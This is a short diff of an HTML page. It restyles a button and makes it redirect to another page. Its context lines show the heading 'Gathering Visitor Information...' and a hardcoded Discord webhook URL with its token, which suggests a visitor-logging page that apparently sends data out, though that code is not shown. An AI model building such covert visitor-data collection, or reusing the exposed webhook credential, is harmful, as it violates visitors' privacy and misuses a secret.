@@ -34,20 +34,21 @@
 
         button:hover {
             background: #add8e6;
+            transform: scale(1.1); /* Add a smooth pop-up effect on hover */
         }
 
         button:active {
-            transform: scale(1.1); /* Add a smooth pop-up effect */
+            transform: scale(1); /* Return to normal size when clicked */
         }
     </style>
 </head>
 <body>
     <h1>Gathering Visitor Information...</h1>
-    <button onclick="sayHi()">Click Me</button>
+    <button onclick="redirectToPage()">Click Me</button>
 
     <script>
-        function sayHi() {
-            alert('Hi!');
+        function redirectToPage() {
+            window.location.href = 'page1.html'; // Redirect to page1.html
         }
 
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
